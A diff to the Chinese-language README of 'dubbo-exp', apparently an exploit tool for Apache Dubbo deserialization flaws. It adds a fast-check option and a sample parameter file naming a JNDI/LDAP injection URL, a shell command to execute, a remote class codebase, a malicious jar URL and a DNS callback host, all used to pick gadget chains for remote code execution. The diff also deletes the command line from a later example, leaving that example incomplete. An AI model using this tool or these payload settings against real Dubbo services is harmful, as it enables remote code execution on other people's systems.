@@ -12,10 +12,38 @@ usage: java -jar exp.jar [OPTION]
 - -p --protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
 - -s --serialization <arg>          [hessian|java] 序列化类型，默认缺省hessian
 - -t --target <arg>          目标，例：127.0.0.1:20880
+- -f --fastcheck <arg>
+
+例（快速攻击检测，若不指定序列化类型，则全部gadget都会尝试）：
+```
+java -jar dubbo-exp.jar
+--target 127.0.0.1:20881 
+--fastcheck /Users/threedr3am/dubbo-exp/check.data
+```
+check.dat预置参数文件内容：
+```
+### 快速漏洞攻击参数配置（将会根据相应匹配的参数选择对应的所有gadget攻击）
+### 多个参数英文逗号分割
+
+#JNDI注入url
+JNDI=ldap://127.0.0.1:43658/Calc
+
+#执行的shell命令
+CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
+
+#Reference远程class代码url
+CODEBASE=http://127.0.0.1:80,Calc
+
+#恶意jar包url
+JAR=http://127.0.0.1:8080/R.jar,Calc
+
+#DNS服务url
+DNS=http://xxxx.ceye.io
+```
 
 例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
 ```
-java -jar dubbo-exp.jar
+
 --target
 127.0.0.1:20881
 --protocol
